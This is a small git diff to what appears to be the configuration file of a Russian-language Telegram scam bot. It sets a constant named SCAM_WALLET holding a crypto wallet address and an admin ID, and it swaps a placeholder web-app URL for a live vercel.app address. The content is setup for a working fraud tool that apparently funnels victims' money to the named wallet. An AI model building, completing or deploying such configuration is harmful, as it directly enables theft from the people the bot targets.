@@ -7,7 +7,7 @@ SCAM_WALLET = "UQATIzX89EOOTqfsr8KE64MXvVSa4CGybjwmkPv3-yHbI3ZE"
 ADMIN_ID = 1471307057
 
 # Сервер для хостинга WebApp (твой домен)
-WEBAPP_URL = "https://your-domain.com/webapp"
+WEBAPP_URL = "https://test-eta-ochre-xz30ommg0l.vercel.app/"
 
 # Сообщения
 START_MESSAGE = """
